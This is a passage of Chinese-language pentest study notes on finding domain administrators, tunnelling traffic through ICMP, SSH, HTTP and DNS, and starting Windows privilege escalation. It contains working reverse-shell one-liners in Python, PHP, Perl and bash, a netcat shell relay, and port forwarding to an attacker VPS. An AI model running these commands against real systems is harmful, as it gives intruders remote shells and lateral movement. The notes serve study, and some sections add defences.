-ResolveHost<br></code></pre></td></tr></table></figure></li><li><p>如果发现了端口，可以使用客户端连接工具或者nc获取服务端的Banner信息（需要注意一些平时的特定端口）</p></li></ol><p><strong>域管理员定位</strong></p><p>当计算机加入域后会默认给域管理员赋予本地系统管理员权限，域管理员组的成员均可访问本地计算机，并且具备完全的控制权限。在域网络攻击测试中，获取域内的一个支点后，需要获取域管理员的权限。</p><p>假设现在在Windows域中取得了普通用户权限，希望在域中横向移动，需要找到域内用户的登录位置，他是否是任何系统的本地管理员，他所属的组，他是否有单访问文件共享等。枚举主机，用户和组，有助于更好的了解域的布局。</p><ol><li><p><code>psloggedon.exe</code> 可以查看本地登录的用户和通过本地计算机或远程计算机的资源登录的用户（某些功能需要管理员权限）</p><p>下载：<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon">https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon</a></p></li><li><p><code>PVEFindADUser.exe</code> 用于查找活动目录用户登录的位置，枚举域用户，以及在特定计算机上登录的用户，包括本地用户，通过RDP登录的用户，用于运行服务和计划任务的用户。（运行需要管理员权限）</p><p>下载：<a href="https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn">https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn</a></p></li><li><p><code>netview.exe</code>枚举工具，使用了WinAPI枚举系统，利用NetSessionEnum找寻登录会话，利用NetShareEnum找寻共享，利用NetWkstaUserEnum枚举登录用户。能够查询共享入口和有价值的用户，大部分功能不需要管理员权限</p><p>下载：<a href="https://github.com/mubix/netview/releases">https://github.com/mubix/netview/releases</a></p></li><li><p><code>Nmap</code>的NSE脚本</p><ul><li><code>smb—enum-domains.nse</code>：对域控进行信息收集，可以获取主机信息，用户，可使用密码策略的用户</li><li><code>smb—enum-users.nse</code>：渗透测试时如果获取到域内某台主机的权限，但是权限有限无法获取更多的域用户信息时，可以使用这个脚本来对域控制器进行扫描</li><li><code>smb—enum-shares.nse</code>：遍历远程主机的共享目录</li><li><code>smb—enum-processes.nse</code>：对主机系统进程遍历，从而知道目标主机运行了哪些软件</li><li><code>smb—enum-sessions.nse</code>：获取域内主机的用户登录会话，查看当前是否有用户登录</li><li><code>smb—enum-discovery.nse</code>：收集目标主机的信息（操作系统，计算机名，域名…………）</li></ul><p>脚本下载链接：<a href="https://nmap.org/nsedoc/scripts/">https://nmap.org/nsedoc/scripts/</a></p></li><li><p><code>PowerView</code>脚本，它是<code>powershell</code>的脚本，提供了辅助定位关键用户的功能</p><p>下载：<a href="https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView">https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView</a></p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs groovy">Get-<span class="hljs-attr">NetDomain:</span> 获取当前用户所在域的名称 <br>Get-<span class="hljs-attr">NetUser:</span> 获取所有用户的详细信息 <br>Get-<span class="hljs-attr">NetDomainController:</span> 获取所有域控制器的信息 <br>Get-<span class="hljs-attr">NetComputer:</span> 获取域内所有机器的详细信息 <br>Get-<span class="hljs-attr">NetOU:</span> 获取域中的OU信息 <br>Get-<span class="hljs-attr">NetGroup:</span> 获取所有域内组和组成员信息 <br>Get-<span class="hljs-attr">NetFileServer:</span> 根据SPN获取当前域使用的文件服务器信息 <br>Get-<span class="hljs-attr">NetShare:</span> 获取当前域内所有网络共享信息 <br>Get-<span class="hljs-attr">NetSession:</span> 获取指定服务器的会话 <br>Get-<span class="hljs-attr">NetRDPSession:</span> 获取指定服务器的远程连接 <br>Get-<span class="hljs-attr">NetProcess:</span> 获取远程主机的进程 <br>Get-<span class="hljs-attr">UserEvent:</span> 获取指定用户的日志 <br>Get-<span class="hljs-attr">ADObiect:</span> 获取活动目录的对象 <br>Get-<span class="hljs-attr">NetGPO:</span> 获取域内所有的组策略对象 <br>Get-<span class="hljs-attr">DomainPolicy:</span> 获取域默认策略或域控制器策略 <br>Invoke-<span class="hljs-attr">UserHunter:</span> 获取域用户登录的计算机信息及该用户是否有本地管理员权限 <br>Invoke-<span class="hljs-attr">ProcessHunter:</span> 通过查询域内所有的机器进程找到特定用户 <br>Invoke-<span class="hljs-attr">UserEvenHunter:</span> 根据用户日志查询某域用户登录过哪些域机器。<br></code></pre></td></tr></table></figure></li><li><p>Empire的user_hunter模块</p></li></ol><p><strong>查找域管理进程</strong></p><p>假设：在某个内网环境中获得了一个域普通用户的权限，然后提权<strong>获得了当前服务器的本地管理员权限</strong>，然后分析当前服务器的用户登录列表以及会话信息，知道了哪些用户登录了这台服务器，但是最后发现可以获取权限的登录用户<strong>都不是域管理账户，</strong>同时<strong>没有域管理员组中的用户登录这台服务器</strong>，就可以使用另一个账户并<strong>寻找该账户在内网哪台机器上具有权限</strong>，<strong>再枚举这台机器上的登录用户</strong>，然后继续渗透测试知道获得域管理员权限为止。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">net<span class="hljs-built_in"> group </span><span class="hljs-string">&quot;domain admins&quot;</span> /domain 收集域管理员列表<br>tasklist /v 查询进程和进程所属用户（注意管理员用户）<br>net<span class="hljs-built_in"> group </span><span class="hljs-string">&quot;domain controllers&quot;</span> /domain 查询域控制器列表<br></code></pre></td></tr></table></figure><p>收集所有活动域的会话列表：使用netsess.exe ：<code>NetSess -h</code></p><p>交叉引用域管理员列表和活动会话列表：这样可以确定哪些IP地址具有活动域令牌，可以使用<code>netsess.exe</code>的windows命令行。将域控制器列表添加到dcs.txt 将域管理员列表添加到admins.txt中，并与netsess.exe放在同一目录下，运行</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">FOR /F <span class="hljs-symbol">%i</span> in (dcs.txt) do <span class="hljs-title">@echo</span> [+] Querying DC <span class="hljs-symbol">%i</span> &amp;&amp; <span class="hljs-title">@netsess</span> -h <span class="hljs-symbol">%i</span> <span class="hljs-number">2</span>&gt;<span class="hljs-keyword">null</span> &gt;sessions.txt &amp;&amp; FOR /F <span class="hljs-symbol">%a</span> in (admin.txt) DO <span class="hljs-title">@type</span> sessions.txt | <span class="hljs-title">@findstr</span> /I <span class="hljs-symbol">%a</span><br></code></pre></td></tr></table></figure><p>如果目标机器是在域系统中是通过共享的本地管理员账户运行的，就可以使用下列脚本来查询系统中的域管理任务</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sas">FOR /F <span class="hljs-name">%i</span> <span class="hljs-meta">in</span> (ips.txt) <span class="hljs-meta">DO</span> @echo [+] <span class="hljs-name">%i</span> <span class="hljs-variable">&amp;&amp;</span> @tasklist /V /S <span class="hljs-name">%i</span> /U user /P password 2&gt;<span class="hljs-meta">NULL</span> &gt; <span class="hljs-meta">output</span>.txt <span class="hljs-variable">&amp;&amp;</span> FOR /F <span class="hljs-name">%n</span> <span class="hljs-meta">in</span> (name.txt) <span class="hljs-meta">DO</span> @type <span class="hljs-meta">output</span>.txt | findstr <span class="hljs-name">%n</span> &gt; <span class="hljs-meta">NULL</span> <span class="hljs-variable">&amp;&amp;</span> echo [!] <span class="hljs-name">%n</span> was found running a process <span class="hljs-meta">on</span> <span class="hljs-name">%i</span> <span class="hljs-variable">&amp;&amp;</span> pause<br>ips.txt 系统列表<br>names.txt 域管理员列表<br></code></pre></td></tr></table></figure><p>某些版本的windows操作系统允许用户通过NetBIOS查询已经登录用户，可以运行下面这个命令行脚本扫描远程系统活跃中的管理员会话</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sas">for /F <span class="hljs-name">%i</span> <span class="hljs-meta">in</span> (ips.txt) <span class="hljs-meta">do</span> @echo [+] Checking <span class="hljs-name">%i</span> <span class="hljs-variable">&amp;&amp;</span> nbtstat -A <span class="hljs-name">%i</span> 2&gt;<span class="hljs-meta">NULL</span> &gt;nbsessions.txt <span class="hljs-variable">&amp;&amp;</span> FOR /F <span class="hljs-name">%n</span> <span class="hljs-meta">in</span> (admins.txt) <span class="hljs-meta">DO</span> @type nbsessions.txt | findstr /I <span class="hljs-name">%n</span> &gt; <span class="hljs-meta">NULL</span> <span class="hljs-variable">&amp;&amp;</span> echo [!] <span class="hljs-name">%n</span> was found logged <span class="hljs-meta">into</span> <span class="hljs-name">%i</span><br>ips.txt 系统列表<br>names.txt 域管理员列表<br></code></pre></td></tr></table></figure><p>也可以使用<code>nbtscan</code>工具</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas">for /F <span class="hljs-name">%i</span> <span class="hljs-meta">in</span> (ips.txt) <span class="hljs-meta">do</span> @echo [+] Checking <span class="hljs-name">%i</span> <span class="hljs-variable">&amp;&amp;</span> nbtstat -f <span class="hljs-name">%i</span> 2&gt;<span class="hljs-meta">NULL</span> &gt;nbsessions.txt <span class="hljs-variable">&amp;&amp;</span> FOR /F <span class="hljs-name">%n</span> <span class="hljs-meta">in</span> (admins.txt) <span class="hljs-meta">DO</span> @type nbsessions.txt | findstr /I <span class="hljs-name">%n</span> &gt; <span class="hljs-meta">NULL</span> <span class="hljs-variable">&amp;&amp;</span> echo [!] <span class="hljs-name">%n</span> was found logged <span class="hljs-meta">into</span> <span class="hljs-name">%i</span><br></code></pre></td></tr></table></figure><p><strong>域分析工具</strong>：<code>BloodHound</code></p><blockquote><p>以上提到的工具的具体使用需要结合实战靶场</p></blockquote><h4 id="隐藏通信隧道技术"><a href="#隐藏通信隧道技术" class="headerlink" title="隐藏通信隧道技术"></a>隐藏通信隧道技术</h4><p>一般的网络通信就是先在两台机器之间建立TCP连接，然后进行正常的数据通信。</p><p>隧道：一种绕过端口屏蔽的通信方法。防火墙两端的数据报通过防火墙所允许的数据包类型或者端口进行封装，然后穿过防火墙，与对方通信。当被封装的数据包到达目的地时，将数据还原，并将还原的数据包发送到相应的服务器上。</p><p>常用的隧道</p><ul><li>网络层：IPV6隧道，ICMP隧道，GRE隧道</li><li>传输层：TCP隧道，UDP隧道，常规端口转发</li><li>应用层：ssh隧道，HTTP隧道，HTTPS隧道，DNS隧道</li></ul><h5 id="判断内网连通性"><a href="#判断内网连通性" class="headerlink" title="判断内网连通性"></a>判断内网连通性</h5><ol><li>ICMP协议：<code>ping</code></li><li>TCP协议：<code>netcat</code></li><li>HTTP协议：<code>curl</code></li><li>DNS协议：<code>nslookup</code>，<code>dig</code></li></ol><p>如果遇见流量不能直接流出，内网中有代理服务器时的判断方法</p><ol><li><p>查看内网中是否存在类似”proxy”名称的机器</p></li><li><p>查看IE浏览器的直接代理</p></li><li><p>更具pac文件的路径（本地路径或者远程路径），将其下载查看</p></li><li><p>利用curl工具确认</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">curl www<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span>  <span class="hljs-comment">//不通</span><br>curl -x proxy-ip:port www<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span> <span class="hljs-comment">//通</span><br></code></pre></td></tr></table></figure></li></ol><h5 id="网络层隧道技术"><a href="#网络层隧道技术" class="headerlink" title="网络层隧道技术"></a>网络层隧道技术</h5><p>在网络层中最常用的隧道协议就是IPv6和ICMP</p><h6 id="IPv6隧道"><a href="#IPv6隧道" class="headerlink" title="IPv6隧道"></a><strong>IPv6隧道</strong></h6><p>IPv6隧道技术是指通过IPv4隧道传送IPv6数据报文的技术，工作原理过程：</p><ol><li>节点A向节点B发送IPv6报文，首先在节点A和节点B之间建立一个隧道</li><li>节点A将<strong>IPv6报文封装</strong>在以节点<strong>B的IPv4地址为目的地</strong>，以<strong>自己的IPv4地址为源地址</strong>的<strong>IPv4报文中发送</strong></li><li>这个报文和普通的IPv4报文一样，经过IPv4的转发到达节点B</li><li>节点B收到此报文后，解除IPv4封装，取出其中的IPv6报文</li></ol><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210730095849745.png" alt="image-20210730095849745"></p><blockquote><p>即使设备支持IPv6，也可能无法正确分析封装了IPv6报文的IPv4数据包。</p><p>配置隧道和自动隧道的主要区别：只有在执行隧道功能的节点的IPv6地址是IPv4兼容地址时，自动隧道才可行，为执行隧道功能的节点分配IP地址时，采用自动隧道方法就不需要进行配置；配置隧道的方法则要求隧道末端节点使用其他机制来获得其IPv4地址，例如DHCP，人工配置或者其他IPv4的配置机制</p></blockquote><p>支持IPv6的隧道工具有<code>socat</code>，<code>6tunnel</code>，<code>nt6unnel</code>等</p><h6 id="ICMP隧道"><a href="#ICMP隧道" class="headerlink" title="ICMP隧道"></a><strong>ICMP隧道</strong></h6><p>如果攻击者使用各类上层隧道（HTTP隧道，DNS隧道，常规正/反向端口转发等）的操作都失败了，可以使用ping命令尝试建立ICMP隧道，将TCP/UDP数据封装到ICMP的ping数据包中，从而穿过防火墙。</p><p>常见工具</p><ol><li><p><code>icmpsh</code>：<a href="https://github.com/bdamele/icmpsh">https://github.com/bdamele/icmpsh</a></p><p>使用的注意事项：</p><ul><li>需要安装<code>python-impacket</code>类</li><li>需要关闭本地系统的ICMP应答，<code>sysctl -w net.ipv4.icmp_echo_ignore_all=1</code>（开启设置为0）</li></ul></li><li><p><code>PingTunnel</code>：配置起来比较麻烦，需要安装很多环境</p></li><li><p><code>icmptunnel</code></p></li><li><p><code>powershell icmp</code></p></li></ol><p><strong>防御方法</strong></p><ul><li>检测同一来源的数据包的数量</li><li>注意Payload大于64bit的ICMP数据包</li><li>寻找响应数据包中的payload与请求数据包中的payload不一致的ICMP数据包</li><li>检查ICMP数据包的协议标签，例如<code>icmptunnel</code>会在所有的ICMP payload前面添加一个TUNL标记来标识隧道</li></ul><h5 id="传输层隧道技术"><a href="#传输层隧道技术" class="headerlink" title="传输层隧道技术"></a>传输层隧道技术</h5><p>传输层技术包括TCP隧道，UDP隧道和常规的端口转发。</p><h6 id="lcx端口转发"><a href="#lcx端口转发" class="headerlink" title="lcx端口转发"></a><strong>lcx端口转发</strong></h6><p>lcx是一个基于Socket套接字实现的端口转发工具，有Windows（lcx.exe）和Linux（portmap）两个版本，一个正常的Socket隧道必须具备两端：一端为服务端，监听一个端口，等待客户端的连接；另一端为客户端，通过传入服务端的IP和端口才能主动与服务器连接</p><p>下载：<a href="https://github.com/UndefinedIdentifier/LCX">https://github.com/UndefinedIdentifier/LCX</a></p><p><strong>内网端口转发</strong></p><p>在目标主机上执行命令，将目标机器的3389端口的所有数据转发到公网VPS的4444端口上<code>lcx.exe -slave &lt;公网IP&gt; 4444 127.0.0.1 3389</code></p><p>在VPS上执行命令，将本地4444端口上监听的所有数据转发到本机的5555端口上<code>lcx.exe -listen 4444 5555</code></p><p>利用mstsc登录远程桌面&lt;公网IP&gt;:5555 或者在VPS上直接连接远程桌面127.0.0.1:5555</p><p><strong>本地端口映射</strong></p><p>如果目标服务器由于防火墙的限制，部分端口无法通过防火墙，可以将目标服务器的相应端口的数据传到防火墙允许的其他端口（例如53）<code>lcx -tran 53 &lt;目标主机IP地址&gt; 3389</code></p><h6 id="netcat"><a href="#netcat" class="headerlink" title="netcat"></a><strong>netcat</strong></h6><p><strong>简单使用</strong></p><ul><li><p>抓取Banner信息<code>nc -nv 192.168.123.123 21</code> 抓取目标主机21端口的Banner信息</p></li><li><p>远程连接主机<code>nc -nvv 192.168.123.123 80</code></p></li><li><p>端口扫描<code>nc -v 192.168.123.123 80</code>  <code>nc -v -z 192.168.123.123 20-1024</code>（扫描端口段速度较慢）</p></li><li><p>端口监听<code>nc -l -p 9999</code> 监听本地端口，访问该端口时会输出该信息到命令行</p></li><li><p>文件传输vps输入<code>nc -lp 333 &gt; 1.txt</code> 目标主机输入<code>nc -vn 192.168.1.4 333 &lt; test.txt -q 1</code>一旦连接建立，数据便会流入</p></li><li><p>获取shell</p><ul><li><p>客户端连接服务器，客户端获取服务器shell这种称为正向shell</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210730113202468.png" alt="image-20210730113202468"></p></li><li><p>客户端连接服务器，服务器获取客户端shell这种称为反向shell，反向shell通常用在开启防火措施的目标主机上</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210730113725281.png" alt="image-20210730113725281"></p></li><li><p>目标主机没有nc时获取反向shell</p><ul><li><p>python反向shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">&#x27;import socket,subprocess,os; \</span><br><span class="hljs-string">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);</span><br><span class="hljs-string">s.connect((&quot;192.168.1.4&quot;,2222));</span><br><span class="hljs-string">os.dup2(s.fileno(),0);</span><br><span class="hljs-string">os.dup2(s.fileno(),1);</span><br><span class="hljs-string">os.dup2(s.fileno(),2);</span><br><span class="hljs-string">p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br></code></pre></td></tr></table></figure></li><li><p>PHP反向shell</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">php -r <span class="hljs-string">&#x27;$sock=fsockopen(&quot;192.168.1.4&quot;,2222);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></code></pre></td></tr></table></figure></li><li><p>Perl反向shell</p><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tcl">perl -e &#x27;use Socket;$i=<span class="hljs-string">&quot;192.168.1.4&quot;</span>;$p=<span class="hljs-number">4444</span>;<span class="hljs-keyword">socket</span>(S,PF_INET,SOCK_STREAM,getprotobyname(<span class="hljs-string">&quot;tcp&quot;</span>)),<span class="hljs-keyword">if</span>(connect(S,sockaddr_in($p,inet_aton($i))))&#123;<span class="hljs-keyword">open</span>(STDIN,<span class="hljs-string">&quot;&gt;&amp;S&quot;</span>);<span class="hljs-keyword">open</span>(STDOUT,<span class="hljs-string">&quot;&gt;&amp;S&quot;</span>);<span class="hljs-keyword">open</span>(STDERR,<span class="hljs-string">&quot;&gt;&amp;S&quot;</span>);<span class="hljs-keyword">exec</span>(<span class="hljs-string">&quot;/bin/sh -i&quot;</span>);&#125;;&#x27;<br></code></pre></td></tr></table></figure></li><li><p>bash反向shell <code>bash -i &gt;&amp; /dev/tcp/192.168.1.4/4444 0&gt;&amp;1</code></p></li></ul></li></ul></li><li><p>内网代理</p><p>假设限制获取到了Web服务器的权限，通过Kali不能访问到数据库服务器，web服务器可以访问数据库服务器。使用netcat通过web服务器代理使kali获取到数据库服务器的shell</p><p>kali：<code>nc -lvp 9999</code></p><p>数据库服务器：<code>nc -lvp 9999 -e /bin/sh</code></p><p>web服务器：<code>nc -v kali-ip 9999 -c &quot;nc -v 数据库-ip 9999&quot;</code></p></li></ul><h6 id="PowerCat"><a href="#PowerCat" class="headerlink" title="PowerCat"></a><strong>PowerCat</strong></h6><p>PowerCat可以说是nc的powershel版，它可以通过执行命令回到本地运行，也可以使用远程权限运行，具体使用方法打到靶场再来总结</p><h5 id="应用层隧道技术"><a href="#应用层隧道技术" class="headerlink" title="应用层隧道技术"></a><strong>应用层隧道技术</strong></h5><h6 id="SSH协议"><a href="#SSH协议" class="headerlink" title="SSH协议"></a><strong>SSH协议</strong></h6><p>内网中Linux/UNIX服务器和网络设备都支持SSH协议，一般情况下SSH协议是被允许通过防火墙和边界设备的。SSH协议的传输过程</p><p> <img src="https://gitee.com/lcdm123/image/raw/master/image-20210730125530065.png" alt="image-20210730125530065"></p><p><strong>本地转发</strong></p><p>web服务器可以访问数据库服务器，vps可以访问web服务器，vps不能访问数据库  ，以web服务器为跳板机将数据库服务器的端口映射到vps的端口上</p><p><code>ssh -CfNg -L vps-port:数据库服务器-ip:数据库服务器port root@192.168.1.103</code></p><p>SSH进程的本地端口映射可以将本地的某个端口转发到远程指定的机器的指定端口；本地端口转发则是在本地监听一个端口，所有访问这个端口的数据都会通过SSH隧道传输到远端的对应端口</p><p><strong>远程转发</strong></p><p><code>ssh -CfNg -R vps-port:数据库服务器-ip:数据库服务器port root@192.168.1.103</code></p><p><strong>本地转发</strong>是将<strong>远程主机</strong>（服务器）某个端口的<strong>数据转发</strong>到<strong>本地机器的指定端口</strong>。<strong>远程端口转发</strong>则是在<strong>远程主机上监听一个端口</strong>，所有<strong>访问远程服务器指定端口的数据</strong>都会通过<strong>SSH隧道传输到本地对应端口</strong>。</p><p><strong>动态转发</strong></p><p>首先在vps上执行如下命令建立一个动态的SOCKS 4/5代理通道<code>ssh -CfNg -D 7000 root@192.168.1.103</code>，在本地浏览器设置网络代理，通过浏览器访问内网</p><p><strong>防御措施</strong></p><p>SSH隧道被攻击主要是因为系统访问控制措施不够，在系统中配置SSH远程管理白名单，在ACL中限制只有特定的IP地址才能连接SSH，以及设置系统完全使用带外管理等方法来避免这一问题。在内网中至少要限制ssh远程登录的地址和双向访问控制策略</p><h6 id="HTTP-HTTPS协议"><a href="#HTTP-HTTPS协议" class="headerlink" title="HTTP/HTTPS协议"></a><strong>HTTP/HTTPS协议</strong></h6><p>HTTP Service代理用于将所有的流量转发到内网，常见的代理工具有reGeorg，meterpreter，tunna等</p><p>reGeorg是reDuh的升级版，主要功能就是把内网服务器端口的数据通过HTTP、HTTPS隧道转发到本机，实现基于HTTP协议的通信。其脚本特征明显，很多杀软都会对其进行查杀。</p><p>下载：<a href="https://github.com/sensepost/reGeorg">https://github.com/sensepost/reGeorg</a></p><p>使用:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">python reGeorgSocksProxy.py -u http:<span class="hljs-regexp">//i</span>p:port/tunnel.jsp -p <span class="hljs-number">9999</span> 开启隧道端口<br>隧道正常工作后在kali上使用 ProxyChains之类的工具，访问目标内网<br></code></pre></td></tr></table></figure><h6 id="DNS协议"><a href="#DNS协议" class="headerlink" title="DNS协议"></a><strong>DNS协议</strong></h6><p>用于管理僵尸网络和进行APT攻击的服务器叫做C&amp;C服务器，C&amp;C节点分为两种，分别是服务端（攻击者）和客户端（被控制的计算机）。C&amp;C通信是指植入C&amp;C客户端的木马或者后门程序与C&amp;C服务端上的远程控制程序之间的通信。</p><p>DNS隧道的工作原理：在进行DNS查询的时候，如果查询的域名不在DNS服务器本机上的缓存中，就会访问互联网进行查询，然后返回结果。如果在互联网上有一台定制的服务器，那么依靠DNS协议即可进行数据包的交换。从DNS协议角度看 ，这样的操作只是一次次地查询某个特定的域名并且得到解析结果，但其本质问题是，<strong>预期的返回结果应该是一个IP，而事实上返回的结果可以是任意字符串</strong>（例如加密的C&amp;C指令）</p><p>DNS隧道与外部通信时，表面上没有连接外网（内网网关没有转发IP数据包），但实际上内网的DNS服务器进行了中转操作。将其他协议封装在DNS协议中进行传输。</p><p><strong>查看DNS连通性</strong></p><p>首先我们需要找到当前服务器是否允许通过内部DNS解析外部域名</p><p>查看当前内部域名以及IP：<code>cat /etc/resolv.conf | grep -v &#39;#&#39;</code></p><p>查看是否与内部DNS通信：<code>nslookup lcdm123.com</code></p><p>查询是否可以通过内部DNS服务器解析外部域名：<code>nslookup baidu.com</code></p><p><strong>dnscat2</strong></p><p>dnscat2时一款开源软件，它使用DNS协议创建加密的C&amp;C通道，通过预共享密钥进行身份验证。它的客户端是用C语言编写，服务端是用Ruby语言编写。</p><p>dnscat2隧道模式有两种：</p><ul><li>直连模式：客户端直接向指定IP地址的DNS服务器发起DNS解析请求</li><li>中继模式：DNS经过互联网的迭代解析，指向指定的DNS服务器。与直连模式相比，这种比较慢</li></ul><p>DNS隧道应用场景：在安全策略严格的内网环境中，常见的C&amp;C通信端口会被众多安全设备监控，该网段只允许白名单流量出站，同时其他端口都被屏蔽了，传统的C&amp;C通信无法建立。</p><p>工具：</p><ul><li><p>dnscat2</p><p>下载：<a href="https://github.com/iagox86/dnscat2">https://github.com/iagox86/dnscat2</a>   </p><p>​            <a href="https://downloads.skullsecurity.org/dnscat2/">https://downloads.skullsecurity.org/dnscat2/</a>   </p><p>​            <a href="https://github.com/lukebaggett/dnscat2-powershell">https://github.com/lukebaggett/dnscat2-powershell</a></p></li><li><p>iodine</p></li></ul><p><strong>防御DNS隧道攻击</strong></p><ol><li>禁止任何人向外部服务器发送DNS请求，只允许与受信任的DNS服务器通信</li><li>追踪用户的DNS查询次数，设置阈值</li><li>阻止ICMP</li><li>将邮件服务器、网关列入白名单并阻止传入和传出流量中的TXT请求</li></ol><h5 id="SOCKS代理"><a href="#SOCKS代理" class="headerlink" title="SOCKS代理"></a>SOCKS代理</h5><p>常见的网络环境</p><ul><li>服务器在内网中，可以任意访问外部网络</li><li>服务器在内网中，可以访问外部网络但是服务器安装了防火墙来拒绝敏感端口的连接</li><li>服务器在内网中，对外只开放了部分端口，并且服务器不能访问外部网络</li></ul><p>常用的Socks代理工具</p><ul><li><p><code>EarthWorm</code></p><p>体积小，使用时不需要进行其他设置</p><p>下载：<a href="https://github.com/rootkiter/EarthWorm">https://github.com/rootkiter/EarthWorm</a></p></li><li><p><code>reGeorg</code></p><p>上面HTTP隧道时介绍过，它利用webshell建立Socks代理进行内网穿透，服务器必须支持ASPX，PHP，JSP中的一种</p></li><li><p><code>sSocks</code></p></li><li><p><code>SocksCap64</code></p><p>Windows中很好用的一款全局代理软件，操作方便</p><p>下载：<a href="https://www.sockscap64.com/sockscap-64-free-download-zh-hans/">https://www.sockscap64.com/sockscap-64-free-download-zh-hans/</a></p></li><li><p><code>Proxifier</code></p><p>提供了跨平台的端口转发和代理功能，适用于Windows，Linux，MacOS</p><p>下载：<a href="https://www.proxifier.com/">https://www.proxifier.com/</a></p></li><li><p><code>ProxyChains</code></p><p>在Linux下实现全局代理的软件，可以使任何程序通过代理上网，允许TCP和DNS流量通过代理隧道，支持HTTP，SOCKS 4 ，SOCKS 5类型的代理服务器</p></li></ul><h5 id="上传和下载"><a href="#上传和下载" class="headerlink" title="上传和下载"></a><strong>上传和下载</strong></h5><ul><li><p>利用FTP协议上传</p></li><li><p>利用VBS上传</p></li><li><p>利用Debug上传</p><p>将.exe文件转换为HEX的形式，然后通过echo命令将HEX代码写入文件，最后利用Debug功能将HEX代码编译并还原为.exe文件</p></li><li><p>使用<code>Nishang</code>上传</p></li><li><p>利用<code>bitsadmin</code>下载（推荐在windows7 和 8 上使用）</p></li><li><p>利用<code>powershell</code>下载</p></li></ul><h4 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h4><p>Windows的四种权限</p><ol><li><code>User</code>：普通用户权限</li><li><code>Administrator</code>：管理员权限，可以利用windows的机制将自己提升为System权限，以便操作SAM文件等</li><li><code>System</code>：系统权限，可以对SAM等敏感文件进行读取，往往需要将Administrator权限提升到System权限才可以对散列值进行Dump操作</li><li><code>TrustedInstaller</code>：Windows中的最高权限，能够修改系统文件</li></ol><p><strong>纵向提权</strong>：低权限角色获得高权限角色的权限。</p><p><strong>横向提权</strong>：获得同级别角色的权限。例如：在系统A中获取了系统B的权限</p><p><strong>常用的提权方法</strong>：系统内核溢出漏洞提权，数据库提权，错误的系统配置提权，组策略首选项提权，Web中间件漏洞提权，DLL劫持提权，滥用最高权限令牌提权，第三方软件/服务提权等。</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210806163424137.png" alt="image-20210806163424137"></p><h5 id="内核溢出漏洞提权"><a href="#内核溢出漏洞提权" class="headerlink" title="内核溢出漏洞提权"></a>内核溢出漏洞提权</h5><p><a href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a></p><p><a href="https://github.com/lyshark/Windows-exploits">https://github.com/lyshark/Windows-exploits</a></p><p>内核溢出漏洞提权是一种通用的提权方法，通常利用这个方法绕过系统的所有安全限制。如果目标主机没有及时安装补丁，就可以找到相应的EXP提权。</p><p>查看补丁列表：<code>systeminfo</code>  <code>wmic qfe get Caption,Description,HotFixID,Installedon0</code></p><p>查询到补丁安装情况后可以去看哪些补丁漏装了，然后提权。</p><p><code>Windows Exploit Suggester</code>：<a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester">https://github.com/AonCyberLabs/Windows-Exploit-Suggester</a> 这个工具将系统以及安装的补丁和微软的漏洞数据库进行比较识别出可能导致权限提升的漏洞，而其只需要目标系统的信息。</p><p>这个是<a href="https://github.com/bitsadmin/wesng%E4%B8%8A%E9%9D%A2%E7%9A%84%E5%8D%87%E7%BA%A7%E7%89%88">https://github.com/bitsadmin/wesng上面的升级版</a></p><p>Metasploit内置了<code>local_exploit_suggester</code>模块，用于快速识别系统中可以被利用的漏洞；Powershell的Sherlock脚本可以快速查找可能用于本地权限提升的漏洞<a 